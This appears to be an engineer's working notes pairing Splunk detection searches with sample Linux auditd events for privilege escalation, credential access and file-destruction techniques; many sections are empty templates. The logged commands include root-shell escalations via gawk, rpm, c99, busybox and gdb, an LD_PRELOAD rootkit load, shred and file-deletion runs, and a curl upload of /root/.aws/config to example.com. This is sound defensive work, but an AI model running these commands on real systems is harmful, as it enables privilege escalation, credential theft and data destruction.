type=PATH msg=audit(03/29/2023 18:05:19.118:5912) : item=0 name=/bin/gdb inode=101216555 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 18:05:19.118:5912) : proctitle=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file 
type=USER_CMD msg=audit(03/29/2023 18:05:19.055:5909) : pid=7488 uid=test-2 auid=test-2 ses=339 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/29/2023 18:05:16.156:5907) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x26856f0 a1=0x2683d60 a2=0x2654ee0 a3=0x7ffc3ede28a0 items=2 ppid=6257 pid=7486 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=339 comm=gdb exe=/usr/bin/gdb subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=gdb_priv_escalation 
type=EXECVE msg=audit(03/29/2023 18:05:16.156:5907) : argc=9 a0=gdb a1=-nx a2=-ex a3=shred a4=-n a5=1 a6=-x a7=-z a8=/usr/lib/systemd/test_file 
type=PATH msg=audit(03/29/2023 18:05:16.156:5907) : item=0 name=/usr/bin/gdb inode=101216555 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 18:05:16.156:5907) : proctitle=gdb -nx -ex shred -n 1 -x -z /usr/lib/systemd/test_file 
type=SYSCALL msg=audit(03/29/2023 18:03:53.039:5852) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55fbc2b0d248 a1=0x55fbc2b1f198 a2=0x55fbc2b33ef0 a3=0x0 items=2 ppid=7330 pid=7334 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=339 comm=gdb exe=/usr/bin/gdb subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=gdb_priv_escalation 
``` 



### Linux Kernel Module Enumeration

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 17:59:15.456:5288) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x2651e60 a1=0x2683ca0 a2=0x2654ee0 a3=0x7ffc3ede28a0 items=2 ppid=6257 pid=6937 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=339 comm=kmod exe=/usr/bin/kmod subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=kmod_list 
type=EXECVE msg=audit(03/29/2023 17:59:15.456:5288) : argc=2 a0=kmod a1=list 
type=PATH msg=audit(03/29/2023 17:59:15.456:5288) : item=0 name=/usr/bin/kmod inode=100940327 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:insmod_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 17:59:15.456:5288) : proctitle=kmod list 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:59:07.290:5286) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=kmod_list list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:59:07.290:5183) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=kmod_list list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:59:03.220:5068) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=kmod_list list=exit res=yes
```  



### Linux Shred Overwrite Command

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/29/2023 17:53:44.604:4515) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x26490c0 a1=0x2655460 a2=0x2654ee0 a3=0x7ffc3ede28a0 items=2 ppid=6257 pid=6428 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=339 comm=shred exe=/usr/bin/shred subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=shred_command 
type=EXECVE msg=audit(03/29/2023 17:53:44.604:4515) : argc=6 a0=shred a1=-n a2=1 a3=-x a4=-z a5=/usr/lib/systemd/test_file 
type=PATH msg=audit(03/29/2023 17:53:44.604:4515) : item=0 name=/usr/bin/shred inode=100818001 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/29/2023 17:53:44.604:4515) : proctitle=shred -n 1 -x -z /usr/lib/systemd/test_file 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:53:16.659:4513) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=shred_command list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:53:16.659:4411) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=shred_command list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/29/2023 17:53:09.480:4297) : auid=root ses=318 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=shred_command list=exit res=yes 
```  


### Linux Sudoers Tmp File Creation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PATH msg=audit(03/28/2023 15:47:42.302:9774) : item=1 name=/etc/sudoers.tmp inode=34709948 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 15:47:42.302:9774) : proctitle=touch /etc/sudoers.tmp 
type=USER_CMD msg=audit(03/28/2023 15:47:42.294:9771) : pid=27052 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=touch /etc/sudoers.tmp terminal=pts/1 res=success' 
type=PATH msg=audit(03/28/2023 15:47:33.952:9767) : item=1 name=/etc/sudoers.tmp inode=34709948 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 15:47:33.952:9767) : proctitle=touch /etc/sudoers.tmp 
type=USER_CMD msg=audit(03/28/2023 15:47:33.952:9764) : pid=27044 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=touch /etc/sudoers.tmp terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/28/2023 15:45:34.724:9301) : pid=26754 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=touch /etc/sudoers.tmp terminal=pts/1 res=success' 
```  

### Linux Possible Append Command To At Allow Config File

Datamodel:  
Auditd config:    
CIM Mapping: 
Search:  
Limitations:   
Sample events: 
Comments: will not work as the search is looking for process containing "echo" and "/etc/at.allow". "echo" is a shell built-in commandf

```
 

``` 


### Linux Busybox Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*busybox*" AND Processes.process="*sh*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_busybox_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/28/2023 15:40:43.663:9185) : pid=26286 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=busybox sh terminal=pts/1 res=failed'
``` 


### Linux Preload Hijack Library Calls

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/28/2023 15:37:41.941:8733) : pid=25918 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=export LD_PRELOAD=./librootkit.so terminal=pts/1 res=failed' 
```  


### Linux RPM Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*rpm*--eval*" AND Processes.process="*lua:os.execute*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_rpm_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/28/2023 15:24:04.364:8473) : pid=24661 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=rpm --eval %{lua:os.execute(/bin/sh terminal=pts/1 res=success' 
```  


### Linux Puppet Privilege Escalation -> I cant install

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```

```  


### Linux SSH Authorized Keys Modification

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/28/2023 15:12:05.877:8196) : pid=23568 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=cat /root/.ssh/authorized_keys terminal=pts/1 res=success' 
```  


### Linux Clipboard Data Copy

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/28/2023 15:07:24.531:8122) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf77820 a1=0xf76990 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=23292 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=xclip exe=/usr/bin/xclip subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=xclip 
type=EXECVE msg=audit(03/28/2023 15:07:24.531:8122) : argc=3 a0=xclip a1=-selection a2=clipboard 
type=PATH msg=audit(03/28/2023 15:07:24.531:8122) : item=0 name=/usr/bin/xclip inode=101419723 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 15:07:24.531:8122) : proctitle=xclip -selection clipboard 
type=CONFIG_CHANGE msg=audit(03/28/2023 15:07:04.954:8120) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=xclip list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/28/2023 15:07:04.954:8026) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=xclip list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/28/2023 15:06:46.966:7912) : auid=root ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=xclip list=exit res=yes 
type=SOFTWARE_UPDATE msg=audit(03/28/2023 15:05:48.798:7712) : pid=23058 uid=root auid=root ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='sw=xclip-0.12-1.el6.x86_64 sw_type=rpm key_enforce=0 gpg_res=0 root_dir=/ comm=yum exe=/usr/bin/python2.7 hostname=localhost.localdomain addr=? terminal=pts/0 res=success' 
type=USER_CMD msg=audit(03/28/2023 15:05:46.170:7709) : pid=23056 uid=root auid=root ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=yum -y install xclip --nogpgcheck terminal=pts/0 res=success' 
type=USER_CMD msg=audit(03/28/2023 15:05:02.726:7682) : pid=22978 uid=root auid=root ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=yum -y install xclip terminal=pts/0 res=success' 
type=USER_CMD msg=audit(03/28/2023 15:04:14.314:7667) : pid=22927 uid=root auid=root ses=6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/root cmd=yum -y install xclip terminal=pts/0 res=success' 
```  


### Linux Deletion Of Init Daemon Script

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem  
  where Filesystem.action=deleted Filesystem.file_path IN ( "/etc/init.d/*") 
  by _time span=1h Filesystem.file_name Filesystem.file_path Filesystem.dest Filesystem.process_guid Filesystem.action
  | `drop_dm_object_name(Filesystem)` 
  |rename process_guid as proc_guid 
  | table  process_name process proc_guid file_name file_path action _time parent_process_name parent_process  process_path dest user
  | `linux_deletion_of_init_daemon_script_filter`
```
Limitations:   
Sample events:    

```
type=PATH msg=audit(03/28/2023 14:41:39.067:7072) : item=1 name=/etc/init.d/test4 inode=616114 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 14:41:39.067:7071) : item=1 name=/etc/init.d/test3 inode=616113 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 14:41:39.067:7070) : item=1 name=/etc/init.d/test2 inode=616112 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 14:41:39.067:7069) : item=1 name=/etc/init.d/test1 inode=616111 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 14:41:39.067:7068) : item=1 name=/etc/init.d/test inode=616099 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```  



### Linux Gem Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*gem*open*-e*" AND Processes.process="*-c*" AND Processes.process="*sudo*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_gem_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*gem*open*-e*" AND Processes.process="*-c*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_gem_privilege_escalation_filter`
```  



### Linux High Frequency Of File Deletion In Boot Folder

Datamodel: 
Auditd config:   
CIM Mapping: 
Search: 
```
| tstats `security_content_summariesonly` values(Filesystem.file_name) as deletedFileNames values(Filesystem.user_category) as file_path_location dc(Filesystem.file_path) as numOfDelFilePath count min(_time) as firstTime max(_time) as lastTime 
  FROM datamodel=Endpoint.Filesystem  
  where Filesystem.action=deleted Filesystem.user_category=*boot*
  | where numOfDelFilePath>5
```
Limitations: This is possible in a different way as described:  
1. Alias the obj field to an unused field in the datamodel e.g. user_category  
2. change the search to the example above
3. This search shows large number of deleted files in boot directory  
Sample events:    

```
type=PATH msg=audit(03/28/2023 13:44:54.146:5765) : item=1 name=file4 inode=529172 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:44:54.146:5764) : item=1 name=file5 inode=529171 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:44:54.146:5763) : item=1 name=file6 inode=529170 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:44:54.146:5762) : item=1 name=file7 inode=529169 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:44:54.146:5761) : item=1 name=file8 inode=529168 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:44:54.144:5760) : item=1 name=file9 inode=529167 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5374) : item=1 name=file9 inode=93 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5373) : item=1 name=file8 inode=92 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5372) : item=1 name=file7 inode=91 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5371) : item=1 name=file6 inode=90 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5370) : item=1 name=file5 inode=89 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5369) : item=1 name=file4 inode=88 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5368) : item=1 name=file3 inode=87 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5367) : item=1 name=file2 inode=86 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:25:15.999:5366) : item=1 name=file1 inode=85 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:boot_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```  


### Linux Common Process For Elevation Control

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/28/2023 13:05:24.255:4766) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x23a5510 a1=0x23a40d0 a2=0x23a0c50 a3=0x7fff2305fb60 items=2 ppid=14807 pid=14818 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=chmod exe=/usr/bin/chmod subj=system_u:system_r:unconfined_service_t:s0 key=chmod 
type=EXECVE msg=audit(03/28/2023 13:05:24.255:4766) : argc=3 a0=chmod a1=0640 a2=/etc/audit/audit.rules 
type=PROCTITLE msg=audit(03/28/2023 13:05:24.255:4766) : proctitle=chmod 0640 /etc/audit/audit.rules 
```  


### Linux GNU Awk Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*gawk*" AND Processes.process="*BEGIN*{system*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `linux_gnu_awk_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/28/2023 13:13:51.227:5101) : pid=15390 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=gawk BEGIN {system(/bin/sh;)} terminal=pts/1 res=success' 
```  


### Linux Possible Access To Credential Files

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PATH msg=audit(03/28/2023 13:10:08.042:5043) : item=2 name=/etc/passwd inode=34565154 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:passwd_file_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 13:10:08.042:5043) : item=3 name=/etc/passwd~ inode=34565154 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:passwd_file_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:10:08.042:5043) : proctitle=vi /etc/passwd 
type=PROCTITLE msg=audit(03/28/2023 13:10:08.042:5042) : proctitle=vi /etc/passwd 
type=PROCTITLE msg=audit(03/28/2023 13:10:08.042:5041) : proctitle=vi /etc/passwd 
type=PATH msg=audit(03/28/2023 13:10:03.586:5040) : item=0 name=/etc/.passwd.swp inode=33562211 dev=fd:00 mode=file,600 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:10:03.586:5040) : proctitle=vi /etc/passwd 
type=PATH msg=audit(03/28/2023 13:10:03.586:5039) : item=1 name=/etc/.passwd.swp inode=33554891 dev=fd:00 mode=file,600 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:10:03.586:5039) : proctitle=vi /etc/passwd 
type=PATH msg=audit(03/28/2023 13:10:03.586:5038) : item=1 name=/etc/.passwd.swpx inode=34709945 dev=fd:00 mode=file,600 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:10:03.586:5038) : proctitle=vi /etc/passwd 
type=USER_CMD msg=audit(03/28/2023 13:10:03.450:5035) : pid=15180 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=vi /etc/passwd terminal=pts/1 res=success' 
```  



### Linux c99 Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*c99*" AND Processes.process="*-wrapper*"  by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_c99_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/28/2023 13:05:44.387:4960) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x562f730c1248 a1=0x562f730d3258 a2=0x562f730e6fc0 a3=0x0 items=3 ppid=14900 pid=14902 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=9 comm=c99 exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=c89_priv_escalation 
type=EXECVE msg=audit(03/28/2023 13:05:44.387:4960) : argc=5 a0=/bin/sh a1=/bin/c99 a2=-wrapper a3=/bin/sh,-s a4=. 
type=PATH msg=audit(03/28/2023 13:05:44.387:4960) : item=0 name=/bin/c99 inode=101123553 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:05:44.387:4960) : proctitle=/bin/sh /bin/c99 -wrapper /bin/sh,-s . 
type=USER_CMD msg=audit(03/28/2023 13:05:44.376:4957) : pid=14900 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=c99 -wrapper /bin/sh,-s . terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/28/2023 13:05:08.025:4574) : pid=14752 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=c99 -wrapper /bin/sh,-s . terminal=pts/1 res=success' 
```


### Linux Curl Upload File

Datamodel: processes
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/28/2023 13:02:17.202:4520) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x558c1a5b8248 a1=0x558c1a5ca258 a2=0x558c1a5defa0 a3=0x0 items=2 ppid=14537 pid=14541 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/28/2023 13:02:17.202:4520) : argc=4 a0=curl a1=-F a2=userfile=@/root/.aws/config a3=http://example.com 
type=PATH msg=audit(03/28/2023 13:02:17.202:4520) : item=0 name=/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:02:17.202:4520) : proctitle=curl -F userfile=@/root/.aws/config http://example.com 
type=USER_CMD msg=audit(03/28/2023 13:02:17.202:4517) : pid=14537 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=curl -F userfile=@/root/.aws/config http://example.com terminal=pts/1 res=success' 
type=SYSCALL msg=audit(03/28/2023 13:02:10.222:4514) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79aa0 a1=0xf786f0 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14535 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
